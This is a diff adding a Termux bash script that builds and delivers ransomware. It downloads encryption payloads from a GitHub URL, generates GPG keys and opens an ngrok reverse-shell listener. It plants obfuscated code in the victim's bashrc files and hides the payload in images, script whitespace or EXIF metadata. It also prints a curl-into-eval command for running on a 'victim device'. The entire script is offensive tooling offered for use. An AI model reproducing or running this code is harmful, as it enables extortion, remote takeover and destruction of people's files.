@@ -1,0 +1,261 @@
+#!/data/data/com.termux/files/usr/bin/bash
+IFS=$'\n\t'
+trap ctrl_c 2
+
+## SET COLORS
+R='\e[31m'
+G='\e[32m'
+Y='\e[33m'
+B='\e[34m'
+M='\e[35m'
+C='\e[36m'
+W='\e[0m'
+
+killps(){ #KILL ALL PREVIOUS PROCESS
+  for svc in php lt ngrok;do
+    [[ $(ps aux|grep -o "$svc"|head -n1) ]] && {
+      pkill -f -2 $svc >/dev/null 2>&1;killall -2 $svc >/dev/null 2>&1
+    }
+  done
+}
+
+ctrl_c(){ #TRAP CTRL+C SHOURTCUT
+  printf "\n$Y\n   (¿) Need a help (?)$B\nTelegram : t.me/Ivam3_Bot$W\n";killps
+  exit 0
+}
+
+chk-pkg(){ #CHECK DEPENDENCIES
+  command -v $1 >/dev/null || {
+    printf "$R[E]$W $1 needed$R |$W run $3 install $2"
+    exit
+  }
+}
+
+#BANNER
+printf "$(clear)$M ____                                      __  __\n|  _ \ __ _ _ __  ____ ___  _ __ ___  _   _\ \/ /\n| |_) / _\` | '_ \/ __|/ _ \| '_ \` _ \| | | |\  /\n|  _ < (_| | | | \__ \ (_) | | | | | | |_| |/  \\ \n|_| \_\__,_|_| |_|___/\___/|_| |_| |_|\__,_/_/\_\\ \n#::::::::::::by::Lady::Ransomware::::::::::::::::#$W\n"
+
+## REMOVING GPG PREVIOUS CONFIG
+[[ -d ~/.gnupg ]] && { rm -rf ~/.gnupg;}
+
+## CHECKING DEPENDENCIES
+chk-pkg base64 coreutils apt
+chk-pkg curl curl apt
+chk-pkg gpg gnupg apt
+chk-pkg ncat nmap-ncat apt
+chk-pkg ngrok ngrok apt
+chk-pkg npm nodejs apt
+chk-pkg exiftool exiftool apt
+chk-pkg php php apt
+chk-pkg steghide steghide apt
+chk-pkg snow stegsnow apt
+chk-pkg bash-obfuscate bash-obfuscate npm
+chk-pkg lt localtunnel npm
+
+#SET A METHOD
+## REAL : CREATE A RANSOMWARE WITH TARGET INTERNAL AND EXTERNAL MEMORY ["""WARNING!!"""]
+## TEST : CREATE A RANSOMWARE WITH TEST TARGET AND IT JUST WILL ATTACK ALL FILES INTO DIRECOTRY $HOME/test
+## YOU MUST CREATE IT AND PUT INTO SOME FILES TO TEST IT
+PS3="╰────➤ "
+printf "$G[?]$W Choose a method\n\n"
+select method in Real Test Exit
+do
+  case $method in
+    Real) t=1 ;;
+    Test) t=2 ;;
+    Exit) ctrl_c ;;
+  esac
+  break
+done
+for i in ransomware unransomware
+do
+  curl --tries=20 --quiet \
+    https://raw.githubusercontent.com/ivam3/termux-packages/gh-pages/packages/ransomux/$i \
+    -O ${TMPDIR}/$i.deo
+  sed -i "/for/s/\(T\)/\1$t/" ${TMPDIR}/$i.deo
+done
+
+
+#GENERATE ENCRYPTATION KEY
+printf "$Y[!]$W Let's to create encrypt and decrypt keys$Y\n ╰────➤$W remember, passphrase is the key to delete de ramsonware\n";sleep 2;gpg --generate-key
+uid=$(gpg -k|grep "ultimate"|awk -F " " '{print $3}')
+email=$(gpg -k|grep "ultimate"|awk -F " " '{print $4}')
+gpg --armor --output ~/.gnupg/public-key.gpg --export $email
+key=$(cat ~/.gnupg/public-key.gpg)
+
+#SET THE REVERSE SHELL
+printf "$G[*]$W Setting reverse shell.\n"
+killps && exec ngrok tcp 4546 >/dev/null 2>/dev/null &
+sleep 15
+revHOST="8.tcp.ngrok.io" #$(curl -sSL http://localhost:4040/api/tunnels|cut -d '"' -f14|awk -F "/" '{print $3}'|cut -d ":" -f1)
+revPORT="14413" #$(curl -sSL http://localhost:4040/api/tunnels|cut -d '"' -f14|awk -F "/" '{print $3}'|cut -d ":" -f2)
+
+[[ -z $revHOST ]] && {
+  printf >&2 "$R\nE:$W ngrok tunnel failed\n"
+  ctrl_c
+}
+
+#SET TARGET'S BASH.BASRC FILE
+curl --tries=20 --quiet \
+  https://raw.githubusercontent.com/ivam3/termux-packages/gh-pages/packages/ransomux/lady \
+  -O ${TMPDIR}/lady.deo
+sed "s|HERETUNNEL|'$revHOST'|g" -i ${TMPDIR}/lady.deo
+sed "s|HEREPORT|'$revPORT'|g" -i ${TMPDIR}/lady.deo
+sed "s|EMILIO|$email'|g" -i ${TMPDIR}/lady.deo
+bash-obfuscate ${TMPDIR}/lady.deo -o ${TMPDIR}/lady.ob
+
+#SET TARGET'S >BASHRC FILE
+printf "#!/usr/bin/bash\nsource ${PREFIX}/libexec/termux/.restore" > ${TMPDIR}/bashrc.deo
+bash-obfuscate ${TMPDIR}/bashrc.deo -o ${TMPDIR}/bashrc
+
+#SET RANSOMWARE SCRIPT
+sed "s|HACKERITA|$uid|g" -i ${TMPDIR}/ransomware.deo
+bash-obfuscate ${TMPDIR}/ransomware.deo -o ${TMPDIR}/ransomware.ob
+
+#CODING FILES WITH BASE64
+bashrc64=$(base64 ${TMPDIR}/bashrc)
+unransom64=$(base64 ${TMPDIR}/unransomware.deo)
+lady64=$(base64 ${TMPDIR}/lady.ob)
+ransom64=$(base64 ${TMPDIR}/ransomware.ob)
+rm -rf $TMPDIR/*
+
+cat <<- CONF > ${TMPDIR}/ladyransomware.deo
+command -v gpg >/dev/null || yes|apt install gnupg >/dev/null 2>/dev/null
+command -v base64 >/dev/null || yes|apt install coreutils >/dev/null 2>/dev/null
+echo "$key" > ${TMPDIR}/key.$uid
+gpg --import ${TMPDIR}/key.$uid >/dev/null 2>/dev/null;rm ${TMPDIR}/key.$uid
+cat ${PREFIX}/etc/bash.bashrc > ${PREFIX}/etc/bashito
+base64 -d >${PREFIX}/etc/bash.bashrc<<DIXIE
+$lady64
+DIXIE
+base64 -d >~/.bashrc<<DIXIE
+$bashrc64
+DIXIE
+base64 -d >${PREFIX}/libexec/termux/.restore<<DIXIE
+$unransom64
+DIXIE
+chmod 777 ${PREFIX}/libexec/termux/.restore
+base64 -d >${TMPDIR}/1q2w3e4r5t6y7u8i9o0p.tmp<<DIXIE
+$ransom64
+DIXIE
+chmod 777 ${TMPDIR}/1q2w3e4r5t6y7u8i9o0p.tmp
+source ${TMPDIR}/1q2w3e4r5t6y7u8i9o0p.tmp
+rm -r ${TMPDIR}/1q2w3e4r5t6y7u8i9o0p.tmp
+CONF
+bash-obfuscate ${TMPDIR}/ladyransomware.deo -o ${HOME}/ladyransomware
+rm -f ${TMPDIR}/ladyransomware.deo
+
+rev(){
+  printf "$Y[!] Ransomware file:$W ${HOME}/ladyransomware\n"
+  printf "[+] Reverse:$G ON$Y\n ╰───➤$W wating for connections.\n"
+  while true
+  do
+    ncat -nvlp 4546
+  done
+}
+
+PS3="[R]: "
+printf "$Y[?]$W Choose the method in which the ransomware will be hidden.\n"
+select hide in imagen script-code hide-on-script help exit
+do
+  case $hide in
+    imagen)
+      printf "$G[?]\n$W"
+      while read -p " ╰──set_imagen:─➤ " imgPATH && [ -z $imgPATH ] || [ ! -e $imgPATH ]
+      do
+        printf "$R[E]$W Not such file\n"
+      done
+      [[ $(du -s $imgPATH|awk -F " " '{print $1}') -le "40" ]] && {
+        printf >&2 "$R[E]$W File must to be 400000K almost\n"
+        exit
+      }
+      steghide embed -q -cf $imgPATH -ef ${HOME}/ladyransomware \
+        -f ${HOME}/$imgPATH.$uid -p $uid
+      [[ -e ${HOME}/$imgPATH.$uid ]] && {
+        printf >&2 "$G[+]$W File saved as: ${HOME}/$imgPATH.$uid$Y\n ╰─to─extract─ransomware─run─➤$W steghide extract -sf <path-to-imagen> -p $uid\n"
+      } || {
+        printf >&2 "$R[E]$W embedded fail... Abortinmg"
+        exit
+      };rev
+      ;;
+
+    script-code)
+      select method in method-1 method-2 exit
+      do
+        case $method in
+          method-1)
+            while [ -z $file ] || [ ! -e $file ]
+            do
+              printf "$G[?]$W Path to script: "
+              read file
+            done
+            
+            while ! [ "$line" -eq "$line" ] 2>/dev/null
+            do
+              printf "$G[?]$W Line number where ransomware will be added: "
+              read line
+            done
+            
+            cp $file ${TMPDIR}/$file.lady
+            sed -i "${line}a DIXIE" ${TMPDIR}/$file.lady
+            let line=$line+1
+            sed -i "${line}a source 1Q2W3E4R5T6Y7U8I9O0P" ${TMPDIR}/$file.lady
+            let line=$line+1
+            sed -i "${line}a rm 1Q2W3E4R5T6Y7U8I9O0P" ${TMPDIR}/$file.lady
+            sed "/DIXIE/Q" ${TMPDIR/}$file.lady >>${TMPDIR}/${file}.lady_temp
+            
+            cat << EOL >> ${TMPDIR}/${file}.lady_temp
+base64 -d >1Q2W3E4R5T6Y7U8I9O0P<<DIXIE
+$(base64 ${HOME}/ladyransomware)
+EOL
+            
+            grep -A 9999 'DIXIE' ${TMPDIR}/$file.lady >>${TMPDIR}/${file}.lady_temp
+            rm -f ${TMPDIR}/$file.lady
+            mv ${TMPDIR}/$file.lady_temp ${HOME}/$file.lady
+            [[ $(grep -oE "DIXIE" ${HOME}/$file.lady) ]] && {
+              printf >&2 "$Y[!] DONE!!\n ╰─────➤$W ${HOME}/$file.lady\n"
+            } || {
+              printf >&2 "$R[E]$W File corrupted...Aborting.\n"
+            };rev
+            ;;
+
+          method-2)
+            curl --tries=20 --quiet \
+              https://raw.githubusercontent.com/ivam3/termux-packages/gh-pages/packages/ransomux/lady.jpg \
+              -O ${TMPDIR}/lady.jpg
+            exiftool -Certificate="$(base64 ${HOME}/ladyransomware)" ${TMPDIR}/lady.jpg
+            php -S 127.0.0.1:4546 -t ${TMPDIR} >/dev/null 2>/dev/null &
+            lt -h "http://localtunnel.me" -p 4546 -s mis-imagenes >/dev/null 2>/dev/null &
+            printf "$G[+] DONE!!\n ╰──➤$W Now run on victim device shell or add mannually in some executable script the command$Y\n ╰──➤$W p=\$(curl -s https://mis-imagenes.loca.lt/lady.jpg|grep Cert -a|sed 's/<[^>]*>//g'|sed 's/ //g'|base64 -d);eval \$p\n"
+            rev
+            ;;
+
+          exit)
+            ctrl_c
+            ;;
+        esac
+      done
+      ;;
+    hide-on-script)
+      while [ -z $file2encode ] || [ ! -e $file2encode ]
+      do
+        printf "$Y[?]$W Path to script: "
+        read file2encode
+      done
+      snow -C -f ${HOME}/ladyransomware $file2encode ${HOME}/$file2encode.lady
+      printf "$G[+] DONE!!\n ╰──────➤$W ${HOME}/$file2encode.lady$G\n ╰──────➤$W choose help option for more information\n"
+      rev
+      ;;
+
+    help)
+      printf "$Y(_>)_DETAILS_ABOUT_OPTIONS_(<_)\n ╰─imagen─────────➤$W Hide ransomware on file .png .jpg .jpeg to be transportate: the$Y\n |$W                  ransomware must be extracted to victim device from the image$Y\n |$W                  with command: steghide extract -sf <path-to-imagen>$Y\n ╰─script-code────➤$W Mix ransomware code's with some script(visible code)$Y\n |       ╰─method─1─➤$W Embed obfuscated ransomware code into executable script$Y\n |       ╰─method─2─➤$W Embed obfuscated ransomware code into imagen metadata,$Y\n |         $W           this will active a ssh server to download,extract and execute$Y\n |         $W           the ransomware. It could be execute directly from victim shell$Y\n |         $W           mannually or adding the extracted command into some executable script$Y\n |         $W           command: p=\$(curl -s https://mis-imagenes.loca.lt/image.jpg | grep Cert -a | sed 's/<[^>]*>//g' | sed 's/ //g' | base64 -d);eval \$p$Y\n ╰─hide─on─script─➤$W Hide ransomware code's into some script(code isn't visible):$Y\n |───────|────────|$W the ransomware is hiden into code spaces of any executable script.$Y\n         |$W          To extract it you have to automate the installation process$Y\n         |$W          of stegsnow tool, so add to your script the next lines:$Y\n         ╰────────|$W yes|apt install wget make automake$Y\n         ╰────────|$W wget -q http://http.kali.org/pool/main/s/stegsnow/stegsnow_20130616.orig.tar.gz -O \$TMPDIR/stegsnow.orig.tar.gz$Y\n         ╰────────|$W tar -xvzf \$TMPDIR/stegsnow_20130616.orig.tar.gz -C \$TMPDIR$Y\n         ╰────────|$W cd \$TMPDIR/snow-20130616/;make$Y\n         ╰────────|$W mv \$TMPDIR/snow-20130616/snow \$PREFIX/bin$Y\n         ╰────────|$W rm -rf \$TMPDIR/snow-20130616/ 2>/dev/null$Y\n         ╰────────|$W rm -rf \$TMPDIR/stegsnow_20130616.orig.tar.gz$Y\n         ╰────────|$W chmod 750 \$PREFIX/bin/snow$Y\n         ╰─the─next─lines─will─extract─and─execute─the─ransomware─|\n         ╰────────|$W snow -C <path-embedded-script>$Y\n         ╰────────|$W bash ladyransomware$Y\n         ╰────────|$W rm -f ladyransomware\n\n"
+      ;;
+
+    exit)
+      ctrl_c
+      ;;
+
+    *)
+      printf "$R[E]$W Wrong option\n"
+      ;;
+  esac
+done
